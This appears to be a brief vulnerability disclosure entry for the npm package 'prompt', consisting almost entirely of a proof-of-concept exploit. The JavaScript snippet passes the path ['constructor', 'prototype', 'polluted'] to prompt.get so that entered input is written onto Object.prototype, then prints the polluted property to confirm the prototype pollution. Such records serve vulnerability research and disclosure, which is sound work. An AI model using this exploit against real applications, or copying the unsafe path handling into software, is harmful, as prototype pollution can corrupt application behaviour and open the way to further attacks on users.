# prompt

- package name: `prompt`

- PoC exploit:

```javascript
var prompt = require('prompt');

prompt.get({path: ['constructor', 'prototype', 'polluted'] }, function(err, res) {
    console.log(res);
    console.log(Object.prototype.polluted); // print the input string
});
```